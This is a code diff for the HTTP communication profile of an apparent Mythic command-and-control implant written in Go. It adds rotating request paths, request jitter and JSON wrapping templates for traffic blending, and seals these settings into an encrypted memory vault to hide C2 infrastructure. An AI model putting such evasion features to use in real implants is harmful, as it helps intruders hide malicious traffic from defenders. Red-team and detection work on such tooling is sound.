@@ -32,19 +32,25 @@ type configVault struct {
 // sensitiveConfig holds the C2 configuration fields that should not persist
 // as plaintext in memory. These reveal C2 infrastructure and enable traffic decryption.
 type sensitiveConfig struct {
-	BaseURL       string            `json:"b"`
-	FallbackURLs  []string          `json:"f,omitempty"`
-	UserAgent     string            `json:"a"`
-	UserAgentPool []string          `json:"ap,omitempty"`
-	EncryptionKey string            `json:"k"`
-	CallbackUUID  string            `json:"c"`
-	HostHeader    string            `json:"h"`
-	GetEndpoint   string            `json:"g"`
-	PostEndpoint  string            `json:"p"`
-	CustomHeaders map[string]string `json:"x,omitempty"`
-	ContentTypes  []string          `json:"ct,omitempty"`
-	MTLSCertPEM   string            `json:"mc,omitempty"` // PEM client certificate for mTLS
-	MTLSKeyPEM    string            `json:"mk,omitempty"` // PEM client private key for mTLS
+	BaseURL            string            `json:"b"`
+	FallbackURLs       []string          `json:"f,omitempty"`
+	UserAgent          string            `json:"a"`
+	UserAgentPool      []string          `json:"ap,omitempty"`
+	EncryptionKey      string            `json:"k"`
+	CallbackUUID       string            `json:"c"`
+	HostHeader         string            `json:"h"`
+	GetEndpoint        string            `json:"g"`
+	PostEndpoint       string            `json:"p"`
+	CustomHeaders      map[string]string `json:"x,omitempty"`
+	ContentTypes       []string          `json:"ct,omitempty"`
+	MTLSCertPEM        string            `json:"mc,omitempty"` // PEM client certificate for mTLS
+	MTLSKeyPEM         string            `json:"mk,omitempty"` // PEM client private key for mTLS
+	GetPaths           []string          `json:"gp,omitempty"` // Traffic profile GET path pool
+	PostPaths          []string          `json:"pp,omitempty"` // Traffic profile POST path pool
+	RequestJitterMinMs int               `json:"jn,omitempty"` // Min request jitter (ms)
+	RequestJitterMaxMs int               `json:"jx,omitempty"` // Max request jitter (ms)
+	RequestWrap        string            `json:"rw,omitempty"` // JSON template for wrapping requests
+	ResponseWrap       string            `json:"ru,omitempty"` // JSON template for unwrapping responses
 }
 
 // HTTPProfile handles HTTP communication with Mythic
@@ -62,10 +68,17 @@ type HTTPProfile struct {
 	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
 	ContentTypes  []string          // Content-Type rotation pool for request body
 	UserAgentPool []string          // User-Agent rotation pool (if set, overrides single UserAgent)
-	client        *http.Client
-	CallbackUUID  string        // Store callback UUID from initial checkin
-	ctIndex       atomic.Uint32 // Round-robin index for Content-Type rotation
-	uaIndex       atomic.Uint32 // Round-robin index for User-Agent rotation
+	GetPaths           []string // Traffic profile GET path rotation pool
+	PostPaths          []string // Traffic profile POST path rotation pool
+	RequestJitterMinMs int      // Minimum per-request jitter (ms) for traffic blending
+	RequestJitterMaxMs int      // Maximum per-request jitter (ms) for traffic blending
+	RequestWrap        string   // JSON template with {DATA} for wrapping outgoing POST bodies
+	ResponseWrap       string   // JSON template with {DATA} for unwrapping server responses
+	client             *http.Client
+	CallbackUUID       string        // Store callback UUID from initial checkin
+	ctIndex            atomic.Uint32 // Round-robin index for Content-Type rotation
+	uaIndex            atomic.Uint32 // Round-robin index for User-Agent rotation
+	pathIndex          atomic.Uint32 // Round-robin index for URI path rotation
 
 	// Fallback C2 URLs for automatic failover when primary is unreachable.
 	FallbackURLs []string
@@ -193,17 +206,23 @@ func (h *HTTPProfile) SealConfig() error {
 	}
 
 	cfg := &sensitiveConfig{
-		BaseURL:       h.BaseURL,
-		FallbackURLs:  h.FallbackURLs,
-		UserAgent:     h.UserAgent,
-		UserAgentPool: h.UserAgentPool,
-		EncryptionKey: h.EncryptionKey,
-		CallbackUUID:  h.CallbackUUID,
-		HostHeader:    h.HostHeader,
-		GetEndpoint:   h.GetEndpoint,
-		PostEndpoint:  h.PostEndpoint,
-		CustomHeaders: h.CustomHeaders,
-		ContentTypes:  h.ContentTypes,
+		BaseURL:            h.BaseURL,
+		FallbackURLs:       h.FallbackURLs,
+		UserAgent:          h.UserAgent,
+		UserAgentPool:      h.UserAgentPool,
+		EncryptionKey:      h.EncryptionKey,
+		CallbackUUID:       h.CallbackUUID,
+		HostHeader:         h.HostHeader,
+		GetEndpoint:        h.GetEndpoint,
+		PostEndpoint:       h.PostEndpoint,
+		CustomHeaders:      h.CustomHeaders,
+		ContentTypes:       h.ContentTypes,
+		GetPaths:           h.GetPaths,
+		PostPaths:          h.PostPaths,
+		RequestJitterMinMs: h.RequestJitterMinMs,
+		RequestJitterMaxMs: h.RequestJitterMaxMs,
+		RequestWrap:        h.RequestWrap,
+		ResponseWrap:       h.ResponseWrap,
 	}
 
 	plaintext, err := json.Marshal(cfg)
@@ -233,6 +252,12 @@ func (h *HTTPProfile) SealConfig() error {
 	h.CustomHeaders = nil
 	h.ContentTypes = nil
 	h.UserAgentPool = nil
+	h.GetPaths = nil
+	h.PostPaths = nil
+	h.RequestJitterMinMs = 0
+	h.RequestJitterMaxMs = 0
+	h.RequestWrap = ""
+	h.ResponseWrap = ""
 
 	return nil
 }
@@ -244,17 +269,23 @@ func (h *HTTPProfile) SealConfig() error {
 func (h *HTTPProfile) getConfig() *sensitiveConfig {
 	if h.vault == nil {
 		return &sensitiveConfig{
-			BaseURL:       h.BaseURL,
-			FallbackURLs:  h.FallbackURLs,
-			UserAgent:     h.UserAgent,
-			UserAgentPool: h.UserAgentPool,
-			EncryptionKey: h.EncryptionKey,
-			CallbackUUID:  h.CallbackUUID,
-			HostHeader:    h.HostHeader,
-			GetEndpoint:   h.GetEndpoint,
-			PostEndpoint:  h.PostEndpoint,
-			CustomHeaders: h.CustomHeaders,
-			ContentTypes:  h.ContentTypes,
+			BaseURL:            h.BaseURL,
+			FallbackURLs:       h.FallbackURLs,
+			UserAgent:          h.UserAgent,
+			UserAgentPool:      h.UserAgentPool,
+			EncryptionKey:      h.EncryptionKey,
+			CallbackUUID:       h.CallbackUUID,
+			HostHeader:         h.HostHeader,
+			GetEndpoint:        h.GetEndpoint,
+			PostEndpoint:       h.PostEndpoint,
+			CustomHeaders:      h.CustomHeaders,
+			ContentTypes:       h.ContentTypes,
+			GetPaths:           h.GetPaths,
+			PostPaths:          h.PostPaths,
+			RequestJitterMinMs: h.RequestJitterMinMs,
+			RequestJitterMaxMs: h.RequestJitterMaxMs,
+			RequestWrap:        h.RequestWrap,
+			ResponseWrap:       h.ResponseWrap,
 		}
 	}
 
